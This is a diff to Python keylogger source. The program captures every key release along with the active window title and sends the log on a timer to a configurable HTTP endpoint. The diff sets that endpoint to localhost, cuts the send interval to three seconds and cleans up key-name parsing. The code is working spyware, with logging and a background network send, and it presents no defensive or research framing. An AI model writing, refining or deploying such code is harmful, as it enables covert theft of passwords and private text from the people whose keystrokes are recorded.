@@ -4,8 +4,8 @@ import requests # to send logs
 import threading # to make log sending repeat in background
 from datetime import datetime, timezone # to classify logs by time sent
 
-URL = 'https://0.0.0.0' # the URL/IP to which you want to send the logs to
-INTERVAL = 30.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
+URL = 'https://127.0.0.1:8000' # the URL/IP to which you want to send the logs to
+INTERVAL = 3.0 # Interval between sending logs (in seconds). Don't make this too low because you're going to DDOS yourself.
 
 def send_log(): # send log
     try:
@@ -37,8 +37,9 @@ threading.Timer(INTERVAL, send_log).start() # start sending logs after the amoun
 # it recursively repeats forever because each time the function runs it schedules itself to be ran again.
 
 while True:
-    key = keyboard.read_event() # get name of key pressed
+    key = str(keyboard.read_event()) # get name of key pressed
     if 'up' in key: # log only key releases so no extra entries are made (often 2 key events are logged for when the key is pressed even though 1 character was typed because it is held for a moment)
+        key = key[14:-3] # leave only the key name
         window_name = pyautogui.getActiveWindowTitle() # get the window name to know what context caused the keys to be pressed
         entry = f"Key Pressed: {key} Active Window: {window_name}" # make the entry
         print(entry) # for debugging purposes
